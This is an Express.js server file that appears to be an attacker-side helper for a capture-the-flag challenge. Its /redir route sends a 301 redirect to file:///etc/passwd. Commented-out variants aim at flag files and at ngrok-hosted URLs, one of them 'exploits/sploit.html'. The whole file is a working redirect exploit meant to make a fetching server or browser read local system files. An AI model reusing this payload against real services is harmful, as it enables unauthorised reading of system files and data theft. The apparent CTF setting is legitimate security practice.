const express = require('express');
const bodyParser = require('body-parser');

const app = express();

app.use(express.static('.', { etag: false }));
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', function(req, res){
  return res.json({});
})

// app.get('/redir', function(req, res){
  // return res.redirect('file:///flag');
  // // return res.redirect('http://d5beba4f0eb4.ngrok.io/index.html');
// })

app.get('/redir', function(req, res){
  console.log('handle redir.');
  // res.set('location', 'http://07acb995ae99.ngrok.io/exploits/sploit.html');
  res.set('location', 'file:///etc/passwd');
  res.status(301);
  // res.set('location', 'file:///etc/passwd');
  // return res.redirect('file:///etc/passwd');
  // return res.redirect('file:///chal/sec9et_fl46.txt');
  return res.send('ok');
  // return res.redirect('http://d5beba4f0eb4.ngrok.io/index.html');
})

console.log('starting')
app.listen(8000)
